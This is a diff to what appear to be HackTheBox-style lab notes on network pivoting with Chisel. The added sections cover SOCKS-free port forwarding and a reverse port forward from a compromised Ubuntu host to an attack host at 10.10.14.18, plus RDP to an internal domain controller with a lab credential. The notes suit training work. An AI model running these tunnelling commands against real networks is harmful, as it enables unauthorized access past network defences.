@@ -42,7 +42,7 @@ In the previous example, we used the compromised machine (Ubuntu) as our Chisel 
 When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
 ## Starting the Chisel Server on our Attack Host
 ```
-d0x777@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+w1j0y@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
 ```
 ## Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks
 ### Ubuntu Server 10.129.202.64
@@ -58,6 +58,29 @@ socks5 127.0.0.1 1080
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 **=> Windows Host reached through the Ubuntu Pivot Host (check mind map for more visual details)**
+# Chisel Port Forwarding (No SOCKS)
+Sometimes we don't need a full SOCKS proxy, just one specific port forwarded — RDP to the DC, say. Chisel does this without proxychains at all, since the forwarded port lands directly on our own loopback.
+## Starting the Chisel Server on the Pivot Host
+```
+ubuntu@WEB01:~$ ./chisel server -v -p 1234
+```
+## Connecting from our Attack Host, Mapping Local 3389 to the DC's 3389
+```
+w1j0y@htb[/htb]$ ./chisel client 10.129.202.64:1234 3389:172.16.5.19:3389
+```
+```
+w1j0y@htb[/htb]$ xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
+```
+**=> RDP to the DC over our own local port, no proxychains needed**
+## Reverse Port Forward
+If the pivot host can't accept inbound connections either, flip it the same way as the reverse SOCKS case above — server on our attack host, client on the pivot forwarding one of its own ports back to us.
+```
+w1j0y@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234
+```
+```
+ubuntu@WEB01$ ./chisel client 10.10.14.18:1234 R:9001:127.0.0.1:8080
+```
+**=> Pivot's local port 8080 is now reachable on our attack host at 9001**
 # Exercise
 ```
 https://github.com/jpillora/chisel/releases
